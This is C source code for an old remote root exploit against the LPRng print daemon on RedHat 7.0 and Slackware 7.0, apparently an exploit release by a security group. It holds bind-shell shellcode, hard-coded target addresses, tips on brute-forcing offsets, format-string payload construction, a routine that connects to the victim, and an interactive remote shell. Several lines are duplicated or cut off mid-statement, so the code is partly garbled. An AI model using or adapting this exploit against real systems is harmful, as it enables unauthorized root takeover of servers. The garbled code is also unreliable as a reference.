/*
 *    REMOTE ROOT EXPLOIT for linux x86 - LPRng-3.6.24-1 (RedHat 7.0)
 *
 * The RedHat 7.0 replaced the BSD lpr with the LPRng package which is 
 * vulnerable to format string attacks because it passes information
 * to the syslog incorrectly.
 * You can get remote root access on machines running RedHat 7.0 with
 * lpd running (port 515/tcp) if it is not fixed, of course (3.6.25).
 *
 * bonus: I tested it too on slackware 7.0 with LPRng3.6.22-1, remember
 * is -not- installed by default (isnt a package of the slackware).
 *
 * and,.. this code is for educational propourses only, do not use
 * it on remote machines without authorization.
 *
 * greets: bruj0, ka0z, dn0, #rdC and #flatline
 *
 * coded by venomous of rdC - Argentinian security group.
 * venomous@rdcrew.com.ar
 * http://www.rdcrew.com.ar
 *
 */

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>

char shellcode[]= // not mine
"\x31\xc0\x31\xdb\x31\xc9\xb3\x07\xeb\x67\x5f\x8d\x4f" 
"\x07\x8d\x51\x0c\x89\x51\x04\x8d\x51\x1c\x89\x51\x08"
"\x89\x41\x1c\x31\xd2\x89\x11\x31\xc0\xc6\x41\x1c\x10"
"\xb0\x66\xcd\x80\xfe\xc0\x80\x79\x0c\x02\x75\x04\x3c"
"\x01\x74\x0d\xfe\xc2\x80\xfa\x01\x7d\xe1\x31\xc0\xfe"
"\xc0\xcd\x80\x89\xd3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80"
"\xfe\xc1\x80\xf9\x03\x75\xf3\x89\xfb\x31\xc0\x31\xd2"
"\x88\x43\x07\x89\x5b\x08\x8d\x4b\x08\x89\x43\x0c\xb0"
"\x0b\xcd\x80\x31\xc0\xfe\xc0\xcd\x80\xe8\x94\xff\xff"
"\xff\x2f\x62\x69\x6e\x2f\x73\x68";

void usage(char *prog);
void makebuffer(char *addr, char *shaddr, int addroffset, int shoffset, int padding , int fsc);
void sigint();
void sigalarm();
void mk_connect(char victim[128], int port);

char yahoo[1024];

struct os
{
	char *addr;
	char *shelladdr;
	char *desc;
	int addroffset;
	int shelladdroffset;
	int pad;
	int fsc;
};

/* generally, the addresses are wrong for a very small value,, i recommend
 * that you bruteforce the retloc + or - by 1..(ex: -50 to +50, steps of 1)
 * if it dont work, try the same but changing the fsc (this is the value
 * of when we start to control the formats strings), start from 290 until
 * 330, it should be enough.
 * and if it still dont work,, :|, try with the offset of the shellcode
 * address, this buffer has nops, so it shouldnt be difficult to guess.
 * make a .sh! :)
 * of course, you can start gdb on your box(es) and dont guess nothing
 * just inspect the program and get the correct values!
 *
 * -venomous
 */

struct os target[]=
{
	{"0xbfffee30", "0xbffff640", "Slackware 7.0 with LPRng-3.6.22.tgz - started from shell", 0, 0, 2,
299},
        {"0xbffff0f0", "0xbffff920", "RedHat 7.0 (Guinness) with LPRng-3.6.22/23/24-1 from rpm -
glibc-2.2-5", 0, 0, 2, 304},
        {NULL,NULL,NULL,0,0}
};


main(int argc, char *argv[])
{
    int port=515,
    so=0,
    padding=0,
    retlocoffset=0,
    shellcodeoffset=0,
    fscT=0;

    char arg,
        victim[128],
    rl[128],
    sh[128];


    if(argc < 3)
        usage(argv[0]);

    bzero(victim,sizeof(victim));
    bzero(rl,sizeof(rl));
    bzero(sh,sizeof(sh));

    while ((arg = getopt(argc, argv, "h:p:r:s:t:P:R:S:c")) != EOF)
    {
        switch(arg)
        {
        case 'h':
            strncpy(victim,optarg,128);
            break;
        case 'p':
            port = atoi(optarg);
            break;
        case 'r':
            strncpy(rl,optarg,128);
            break;
        case 's':
            strncpy(sh,optarg,128);
            break;
        case 't':
            so = atoi(optarg);
            break;
        case 'P':
            padding = atoi(optarg);
            break;
        case 'R':
            retlocoffset = atoi(optarg);
            break;
        case 'S':
            shellcodeoffset = atoi(optarg);
            break;
        case 'c':
            fscT = atoi(optarg);
            break;
        default:
            usage(argv[0]);
            break;
        }
    }

    if(strlen(victim) == 0)
        usage(argv[0]);

    if (strcmp(rl,""))
        target[so].addr = rl;

    if (strcmp(sh,""))
        target[so].shelladdr = sh;

    if (retlocoffset != 0)
        target[so].addroffset = target[so].addroffset + retlocoffset;

    if (shellcodeoffset != 0)
        target[so].shelladdroffset = target[so].shelladdroffset + shellcodeoffset;

    if (padding != 0)
        target[so].pad = target[so].pad + padding;

    if (fscT != 0)
        target[so].fsc = target[so].fsc + fscT;

    signal(SIGINT, sigint);
    makebuffer(target[so].addr, target[so].shelladdr, target[so].addroffset, target[so].shelladdroffset,
target[so].pad, target[so].fsc);
    mk_connect(victim, port);

}

void makebuffer(char *addr, char *shaddr, int addroffset, int shoffset, int padding, int fsc)
{
    cint shoffset, int padding, int fsc)
{
    char *tmp,
    addrtmp[216],
    ot[128];

    int i,b,x,t;
    unsigned long pt;

    char temp[128];
    char a1,a2,a3,a4,a5,a6,a7,a8;
    char fir[12],sec[12],thr[12],f0r[12];
    unsigned long firl,secl,thrl,forl;
    unsigned long pas1,pas2,pas3,pas4;


    bzero(yahoo,sizeof(yahoo));
    bzero(ot,sizeof(ot));
    bzero(addrtmp,sizeof(addrtmp));

    printf("** LPRng remote root exploit coded by venomous of rdC **\n");
    printf("\nconstructing the buffer:\n\n");
    printf("adding bytes for padding: %d\n",padding);
    for(i=0 ; i < padding ; i++)
        strcat(yahoo,"A");

    tmp = addr;
    pt = strtoul(addr, &addr,16) + addroffset;
    addr = tmp;
    printf("retloc: %s + offset(%d) == %p\n", addr, addroffset, pt);
    printf("adding resulting retloc(%p)..\n",pt);
    sprintf(addrtmp, "%p", pt);
    if(strlen(addr) != 10)
    {
        printf("Error, retloc is %d bytes long, should be 10\n",strlen(addr));
        exit(1);
    }

    pt = 0;

    for (i=0 ; i < 4 ; i++)
    {
        pt = strtoul(addrtmp, &addrtmp, 16);
        //strcat(yahoo, &pt);
        bzero(ot,sizeof(ot));
        sprintf(ot,"%s",&pt);
        strncat(yahoo,ot,4);
        pt++;
        sprintf(addrtmp, "%p", pt);
        //printf("addrtmp:%s :yahoo %s\n",addrtmp,yahoo);
    }

    tmp = shaddr;
    pt = 0;
    pt = strtoul(shaddr,&shaddr,16) + shoffset;
    sprintf(ot,"%p",pt);
    shaddr = ot;

    printf("adding shellcode address(%s)\n", shaddr);
    sscanf(shaddr,"0x%c%c%c%c%c%c%c%c",&a1,&a2,&a3,&a4,&a5,&a6,&a7,&a8);

    sprintf(fir,"0x%c%c",a1,a2);
    sprintf(sec,"0x%c%c",a3,a4);
    sprintf(thr,"0x%c%c",a5,a6);
    sprintf(f0r,"0x%c%c",a7,a8);

    firl = strtoul(fir,&fir,16);
    secl = strtoul(sec,&sec,16);
    thrl = strtoul(thr,&thr,16);
    forl = strtoul(f0r,&f0r,16);

    pas1 = forl - 50 - padding;
    pas1 = check_negative(pas1);

    pas2 = thrl - forl;
    pas2 = check_negative(pas2);

    pas3 = secl - thrl;
    pas3 = check_negative(pas3);

    pas4 = firl - secl;
    pas4 = check_negative(pas4);

    sprintf(temp,"%%.%du%%%d$n%%.%du%%%d$n%%.%du%%%d$n%%.%du%%%d$n",pas1,fsc, pas2, fsc+1, pas3,
fsc+2,pas4, fsc+3);
    strcat(yahoo,temp);

    printf("adding nops..\n");
    b = strlen(yahoo);
    for (i=0 ; i < (512-b-strlen(shellcode)) ; i++)
        yahoo[b+i] = '\x90';

    printf("adding shellcode..\n");
    b=+i;
    for (x=0 ; x < b ; x++)
        yahoo[b+x] = shellcode[x];

    strcat(yahoo,"\n");

    printf("all is prepared.. now lets connect to something..\n");

}

check_negative(unsigned long addr)
{
    char he[128];

    sprintf(he,"%d",addr);
    if (atoi(he) < 0)
        addr = addr + 256;
    return addr;
}

void mk_connect(char victim[128], int port)
{
    struct hostent *host;
    struct sockaddr_in den0n;
    int sox;

    den0n.sin_family = AF_INET;
    den0n.sin_port = htons(port);

    host = gethostbyname(victim);
    if (!host)
    {
        printf("cannot resolve, exiting...\n");
        exit(0);
    }

    bcopy(host->h_addr, (struct in_addr *)&den0n.sin_addr, host->h_length);

    sox = socket(AF_INET, SOCK_STREAM, 0);

    signal(SIGALRM, sigalarm);
    alarm(10);

    printf("connecting to %s to port %d\n",host->h_name, port);
    if (connect(sox, (struct sockaddr *)&den0n, sizeof(struct sockaddr)) < 0)
    {
        putchar('\n');
        perror("connect");
        exit(1);
    }
    printf("connected!, sending the buffer...\n\n");
    write(sox, yahoo , strlen(yahoo));
    printf("%s\n", yahoo);
    sleep(1);
    alarm(0);
    runshell(sox);
}

int runshell(int sox)
{
    fd_set  rset;
    int     n;
    char    buffer[4096];

    char *command="/bin/uname -a ; /usr/bin/id\n";


    send(sox, command, strlen(command), 0);

    for (;;) {
        FD_ZERO (&rset);
        FD_SET (sox, &rset);
        FD_SET (STDIN_FILENO, &rset);

        n = select(sox + 1, &rset, NULL, NULL, NULL);
        if(n <= 0)
            return (-1);

        if(FD_ISSET (sox, &rset)) {
            n = recv (sox, buffer, sizeof (buffer), 0);
            if (n <= 0)
                break;

            write (STDOUT_FILENO, buffer, n);
        }

        if(FD_ISSET (STDIN_FILENO, &rset)) {
            n = read (STDIN_FILENO, buffer, sizeof (buffer));
            if (n <= 0)
                break;

            send(sox, buffer, n, 0);
        }
    }
    return (0);
}

void sigalarm()
{
    printf("connection timed out, exiting...\n");
    exit(0);
}

void sigint()
{
    printf("CAUGHT sigint, exiting...\n");
    exit(0);
}


void usage(char *prog)
{
    int i;

    printf("\n** LPRng remote root exploit coded by venomous of rdC **\n");
    printf("Usage:\n\n");
    printf("%s [-h hostname] <-p port> <-r addr> <-s shellcodeaddr> <-t type> <-P padding> <-R offset> <-S
offset> <-c offset>\n\n", prog);
    printf("-h is the victim ip/host\n");
    printf("-p select a different port to connect, default 515\n");
    printf("-r is the address to overwrite\n");
    printf("-s is the address of the shellcode\n");
    printf("You can use a predefined addr/shellcodeadtf("You can use a predefined addr/shellcodeaddr using
-t <number>\n\n");
    printf("availables types:\n\n");
    for (i=0 ; target[i].desc != NULL ; i++)
        printf("%d - %s\n",i,target[i].desc);
    printf("\n-P is to define the padding to use, usually 2\n");
    printf("-R the offset to add to <addr>\n");
    printf("-S the offset to add to <shellcodeaddr>\n");
    printf("-c where we start to control the format string\n\n");
    exit(0);
}

